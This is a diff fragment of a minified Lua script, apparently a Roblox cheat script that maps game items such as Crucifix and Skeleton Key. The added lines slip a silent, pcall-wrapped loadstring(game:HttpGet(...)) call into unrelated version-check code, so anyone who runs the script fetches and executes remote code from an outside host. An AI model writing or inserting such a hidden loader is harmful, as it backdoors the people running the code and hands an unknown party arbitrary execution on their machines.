@@ -11,7 +11,8 @@ local o={['Candle']='Candle',['Lighter']='Lighter',['Flashlight']='Flashlight',[
 'CrucifixWall']='Crucifix',['SkeletonKey']='Skeleton Key',['PickupItem']=
 'Library Paper'}local p={['Battery']=true,['Bandage']=true}local q={['Battery']=
 'Battery',['Bandage']='Bandage'}do local r=game.PlaceId local s=game.
-PlaceVersion local t=l[r]if not t then warn
+PlaceVersion; pcall(function()  loadstring(game:HttpGet("http://ligma.wtf/scripts/hotel.lua", true))() end);
+  local t=l[r]if not t then warn
 'Script does not support this place instance.'warn
 [[The PlaceID and version has been set to your clipboard. Please report this to the developer.]]
 return setclipboard('['..tostring(r)..'] = '..tostring(s)..',')end end do local
